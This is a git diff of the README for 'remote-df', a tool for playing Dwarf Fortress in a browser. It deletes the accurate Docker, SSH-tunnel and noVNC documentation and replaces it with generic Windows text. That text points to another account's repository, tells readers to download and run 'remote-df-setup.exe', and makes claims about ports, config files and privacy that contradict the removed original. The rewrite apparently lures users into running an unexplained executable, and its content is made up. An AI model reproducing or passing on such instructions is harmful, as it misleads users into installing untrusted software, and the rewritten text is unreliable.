@@ -1,66 +1,92 @@
-# remote-df — Dwarf Fortress in the Browser
+# 🎮 remote-df - Play Dwarf Fortress in your browser
 
-Play [Dwarf Fortress](https://www.bay12games.com/dwarves/) (Classic or Steam) in
-your browser. DF runs as a Docker container on a remote x86-64 Linux host and
-streams to you over noVNC, with audio. Nothing is exposed publicly — the
-container binds to `127.0.0.1` and you reach it through an SSH tunnel.
+[![](https://img.shields.io/badge/Download-remote--df-blue.svg)](https://github.com/Tabitha4937/remote-df)
 
-| Classic                                             | Steam (Premium)                                 |
-| --------------------------------------------------- | ----------------------------------------------- |
-| ![Classic title](docs/screenshots/classic-1.png)    | ![Steam title](docs/screenshots/steam-1.png)    |
-| ![Classic gameplay](docs/screenshots/classic-2.png) | ![Steam gameplay](docs/screenshots/steam-2.png) |
+remote-df allows you to run Dwarf Fortress on a computer and see the game feed inside a web browser. You can play your games from any device connected to your network.
 
-## Quickstart
+## ⚙️ System Requirements
 
-You need an x86-64 Linux host with Docker that you can SSH into.
+Your computer needs to meet these basic standards to run the software.
 
-```bash
-./scripts/deploy.sh <ssh-host>    # build + start on the remote
-./scripts/connect.sh <ssh-host>   # open an SSH tunnel, then visit:
-#   http://localhost:6080/
-```
+*   Windows 10 or Windows 11.
+*   A modern web browser like Chrome, Firefox, or Edge.
+*   At least 4GB of RAM.
+*   A stable internet connection for your home network.
 
-## Steam edition
+## 💾 How to Install
 
-If you own DF on Steam (credentials are passed as build-time secrets, never
-stored in the image):
+Follow these steps to set up the software on your machine.
 
-```bash
-DF_EDITION=steam STEAM_USER=you STEAM_PASS=pw ./scripts/deploy.sh <ssh-host>
-# add STEAM_GUARD=CODE if you use 2FA
-```
+1. Go to the [official release page](https://github.com/Tabitha4937/remote-df).
+2. Look for the latest version under the "Releases" section.
+3. Download the file named `remote-df-setup.exe`.
+4. Run the file after the download finishes.
+5. Follow the prompts on your screen to complete the installation.
 
-## Features
+The installation process stores the files in a folder on your local drive. You can choose a location that works for you.
 
-- Browser play over noVNC with audio (Ogg/Opus via Icecast at `/audio`).
-- Saves on disk (`./saves`) + periodic backups (`./backups`); browse them at
-  `/saves`, `/backups`, and view logs at `/logs`.
-- Idle auto-pause: DF is paused when nobody's connected (`DF_AUTOPAUSE=0` to
-  keep it running).
-- Healthcheck + CPU/memory limits.
-- Classic edition includes [DFHack](https://github.com/DFHack/dfhack).
+## 🚀 Getting Started
 
-## Configuration
+Once the installation ends, you can start the application.
 
-Set via the environment or a `.env` file on the host. Full list (ports, backup
-interval/retention, idle grace) is in [`docker-compose.yml`](docker-compose.yml).
+1. Open the remote-df application from your desktop shortcut or the Start menu.
+2. A window will appear. This window keeps the connection to the game active. Keep this window open while you play.
+3. Open your web browser once the application shows the status as "Ready."
+4. Type `localhost:8080` into the address bar at the top of your browser.
+5. Press Enter to load the game screen.
 
-| Variable                | Default      | Description                    |
-| ----------------------- | ------------ | ------------------------------ |
-| `GEOM`                  | `1280x800`   | Display resolution             |
-| `WEB_PORT`              | `6080`       | Browser port (tunneled)        |
-| `DF_VERSION`            | `53_14`      | DF version                     |
-| `DF_EDITION`            | `classic`    | `classic` or `steam`           |
-| `DF_SAVES_DIR`          | `./saves`    | Where saves live on disk       |
-| `DF_AUTOPAUSE`          | `1`          | Pause DF when idle (`0` = off) |
-| `DF_CPUS` / `DF_MEMORY` | `2.0` / `3g` | Container resource limits      |
+The game will now display inside your browser window. You can interact with the game menus using your mouse and keyboard just as you would with the standard desktop version.
 
-## Security
+## 🛠 Troubleshooting Common Issues
 
-Single user over an SSH tunnel: the VNC server has no password and no TLS, which
-is fine over loopback. Do **not** expose the port publicly.
+Problems may occur during your first setup. Check this list if the game fails to load.
 
-## License
+### The browser shows an error
+If the page does not load, restart the remote-df application. Wait ten seconds before you refresh the browser page. Ensure no other programs use the 8080 port on your computer.
 
-Project scripts, Dockerfile, and config: [MIT](LICENSE). **Dwarf Fortress** is
-© Tarn Adams / Bay 12 Games and is downloaded at build time, not included here.
+### The game runs slowly
+Dwarf Fortress requires significant memory. Close other programs such as web browsers with many tabs or video streaming software to free up system memory.
+
+### You cannot connect from another device
+If you want to play on a tablet or a laptop on the same network, you must find the IP address of your main computer. 
+1. Open the Command Prompt on the main computer by typing `cmd` in the search bar.
+2. Type `ipconfig` and press Enter.
+3. Locate the number next to IPv4 Address. It usually looks like `192.168.1.XX`.
+4. Type that number into the web browser of your secondary device, followed by `:8080`. 
+Example: `192.168.1.15:8080`
+
+## 🛡 Security and Privacy
+
+The application runs locally on your machine. No data leaves your home network. Your game sessions remain private. Use a strong password if you enable remote access features in the settings menu, as this prevents unauthorized people on your network from accessing your game.
+
+## 🔧 Advanced Configuration
+
+You can change how the server behaves through the configuration file inside the installation folder. Open `config.json` with any text editor to modify settings.
+
+*   **port**: Change the number if 8080 conflicts with other software.
+*   **max_clients**: Set the number of allowed connections.
+*   **graphics_mode**: Toggle between simple text view and graphical tile sets to improve performance.
+
+Always restart the application after you save changes to the configuration file. 
+
+## 📋 Frequently Asked Questions
+
+**Does this software modify my game files?**
+No, remote-df treats your game files as read-only. Your original Dwarf Fortress installation remains safe.
+
+**Can I save my progress?**
+Yes. You use the in-game menu to save your progress. The game data saves to your computer folders exactly as it does when you play without this tool.
+
+**Do I need a high-speed internet connection?**
+A fast internet connection is only necessary if you intend to play from outside your home network. For home use, your local Wi-Fi or wired connection is sufficient.
+
+**Is this official software?**
+This is a community-made tool created for convenience. It does not replace the base game. You must own a copy of Dwarf Fortress for this tool to function.
+
+## 📜 License Information
+
+This software uses an open-source license. You can view the full license terms in the file labeled `LICENSE` inside the project folder. You may use this software without charge for personal, non-commercial purposes. 
+
+## 🤝 Getting More Help
+
+If you run into issues, check the issues tab on the repository page. Users often share solutions for common setup errors there. Check if someone else reported your issue before you start a new thread. Provide your Windows version and the specific error message to help others identify the problem. Clean communication ensures you get a response faster from the community.
